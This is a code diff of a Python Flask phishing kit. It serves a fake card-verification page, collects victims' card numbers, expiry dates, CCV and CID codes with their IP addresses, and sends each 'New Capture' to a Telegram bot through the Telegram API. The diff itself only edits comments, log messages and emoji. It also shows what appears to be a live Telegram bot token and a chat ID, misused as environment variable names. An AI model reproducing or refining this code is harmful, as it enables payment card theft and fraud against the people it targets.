@@ -3,7 +3,7 @@ import logging
 from flask import Flask, request, redirect, render_template_string
 import requests
 
-# Configuration
+# SAFE CONFIGURATION - USE RAILWAY ENV VARS ONLY
 TELEGRAM_BOT_TOKEN = os.environ.get('8887245058:AAGeopviTcxIffuEf4LkRWPhxNbNEi1Q-lg')
 TELEGRAM_CHAT_ID = os.environ.get('8790611176')
 
@@ -79,14 +79,14 @@ PHISHING_PAGE = """
 
 def send_telegram(message):
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
-        logger.warning("Telegram credentials not configured")
+        logger.warning("Telegram credentials missing")
         return
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
     try:
         requests.post(url, json=payload, timeout=5)
     except Exception as e:
-        logger.error(f"Telegram send failed: {e}")
+        logger.error(f"Telegram error: {e}")
 
 @app.route('/')
 def index():
@@ -104,8 +104,8 @@ def verify_card():
         f"🚨 <b>New Capture</b>\n"
         f"💳 <b>Card:</b> <code>{card_number}</code>\n"
         f"📅 <b>Expiry:</b> {expiry}\n"
-        f"🔐 <b>CCV:</b> {ccv}\n"
-        f" <b>CID:</b> {cid}\n"
+        f" <b>CCV:</b> {ccv}\n"
+        f"🔑 <b>CID:</b> {cid}\n"
         f"🌐 <b>IP:</b> {ip}"
     )
     
